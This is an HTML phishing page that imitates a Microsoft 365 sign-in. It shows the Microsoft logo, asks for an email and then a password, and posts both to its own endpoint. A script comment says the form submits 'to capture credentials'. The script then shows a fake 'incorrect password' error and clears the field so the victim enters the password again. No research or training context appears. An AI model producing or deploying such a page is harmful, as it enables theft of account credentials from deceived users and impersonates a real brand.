<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 440px;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .card {
            background: #ffffff;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
            padding: 44px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 12px;
        }

        .subtitle {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 13px;
            color: #1b1b1b;
            margin-bottom: 4px;
        }

        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 8px 12px;
            font-size: 15px;
            border: 1px solid #8c8c8c;
            background: #fff;
            color: #1b1b1b;
            transition: border-color 0.2s;
        }

        input[type="email"]:hover,
        input[type="password"]:hover,
        input[type="text"]:hover {
            border-color: #1b1b1b;
        }

        input[type="email"]:focus,
        input[type="password"]:focus,
        input[type="text"]:focus {
            outline: none;
            border-color: #0078d4;
            border-width: 2px;
            padding: 7px 11px;
        }

        .checkbox-group {
            margin: 24px 0;
        }

        .checkbox-group label {
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 15px;
        }

        .checkbox-group input[type="checkbox"] {
            margin-right: 8px;
            width: 20px;
            height: 20px;
        }

        .button {
            width: 100%;
            padding: 8px 12px;
            font-size: 15px;
            font-weight: 600;
            background-color: #0067b8;
            color: #ffffff;
            border: none;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .button:hover {
            background-color: #005a9e;
        }

        .button:active {
            background-color: #004578;
        }

        .link {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .error {
            background-color: #fde7e9;
            border: 1px solid #e81123;
            padding: 12px;
            margin-bottom: 16px;
            display: none;
        }

        .error-text {
            color: #e81123;
            font-size: 13px;
        }

        .options {
            margin-top: 24px;
        }

        .divider {
            text-align: center;
            margin: 24px 0;
            position: relative;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: #e1e1e1;
        }

        .divider span {
            background-color: #ffffff;
            padding: 0 16px;
            position: relative;
            font-size: 13px;
            color: #605e5c;
        }

        .footer {
            margin-top: 16px;
            text-align: center;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 16px;
        }

        .ms-logo {
            display: inline-block;
            margin-bottom: 24px;
        }

        #emailSection, #passwordSection {
            display: none;
        }

        .back-button {
            background: none;
            border: none;
            color: #0067b8;
            font-size: 15px;
            cursor: pointer;
            padding: 0;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
        }

        .back-button:hover {
            text-decoration: underline;
        }

        .user-id {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg class="ms-logo" width="108" height="24" viewBox="0 0 108 24" fill="none">
                <rect width="11" height="11" fill="#F25022"/>
                <rect x="13" width="11" height="11" fill="#7FBA00"/>
                <rect y="13" width="11" height="11" fill="#00A4EF"/>
                <rect x="13" y="13" width="11" height="11" fill="#FFB900"/>
            </svg>
        </div>

        <div class="card">
            <div id="errorDiv" class="error">
                <p class="error-text">Your account or password is incorrect. If you don't remember your password, reset it now.</p>
            </div>

            <!-- Email Section -->
            <div id="emailSection">
                <h1>Sign in</h1>
                <div class="subtitle">to continue to Microsoft 365</div>

                <form id="emailForm">
                    <div class="form-group">
                        <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
                    </div>

                    <div class="form-group">
                        <a href="#" class="link">Can't access your account?</a>
                    </div>

                    <div class="form-group">
                        <button type="submit" class="button">Next</button>
                    </div>

                    <div class="divider">
                        <span>or</span>
                    </div>

                    <div class="form-group">
                        <a href="#" class="link">Sign-in options</a>
                    </div>

                    <div class="form-group">
                        <a href="#" class="link">Create a Microsoft account</a>
                    </div>
                </form>
            </div>

            <!-- Password Section -->
            <div id="passwordSection">
                <button type="button" class="back-button" onclick="backToEmail()">
                    ← Back
                </button>

                <h1>Enter password</h1>
                <div class="user-id" id="userEmail"></div>

                <form id="passwordForm" method="POST">
                    <div class="form-group">
                        <input type="password" id="password" name="password" placeholder="Password" required>
                    </div>

                    <div class="form-group">
                        <a href="#" class="link">Forgot password?</a>
                    </div>

                    <div class="checkbox-group">
                        <label>
                            <input type="checkbox" name="keepSignedIn">
                            Keep me signed in
                        </label>
                    </div>

                    <div class="form-group">
                        <button type="submit" class="button">Sign in</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#" class="link">Terms of use</a>
                <a href="#" class="link">Privacy & cookies</a>
                <a href="#" class="link">...</a>
            </div>
        </div>
    </div>

    <script>
        // Show email section by default
        document.getElementById('emailSection').style.display = 'block';

        // Handle email submission
        document.getElementById('emailForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;

            // Store email in hidden field
            const hiddenEmail = document.createElement('input');
            hiddenEmail.type = 'hidden';
            hiddenEmail.name = 'email';
            hiddenEmail.value = email;
            document.getElementById('passwordForm').appendChild(hiddenEmail);

            // Show email in password section
            document.getElementById('userEmail').textContent = email;

            // Switch to password section
            document.getElementById('emailSection').style.display = 'none';
            document.getElementById('passwordSection').style.display = 'block';
            document.getElementById('password').focus();
        });

        // Handle password submission
        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            // Let form submit naturally to capture credentials
            // Optionally show error and reset
            setTimeout(function() {
                document.getElementById('errorDiv').style.display = 'block';
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            }, 100);
        });

        function backToEmail() {
            document.getElementById('passwordSection').style.display = 'none';
            document.getElementById('emailSection').style.display = 'block';
            document.getElementById('errorDiv').style.display = 'none';
        }
    </script>
</body>
</html>
